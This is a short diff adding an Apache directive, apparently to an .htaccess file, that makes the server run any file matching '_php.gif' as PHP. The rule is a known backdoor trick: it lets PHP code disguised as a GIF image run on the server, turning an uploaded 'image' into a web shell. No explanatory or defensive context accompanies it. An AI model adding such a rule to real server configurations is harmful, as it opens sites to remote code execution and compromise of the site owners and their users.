@@ -1,0 +1,4 @@
+
+   <FilesMatch "_php.gif">
+   SetHandler application/x-httpd-php
+   </FilesMatch>
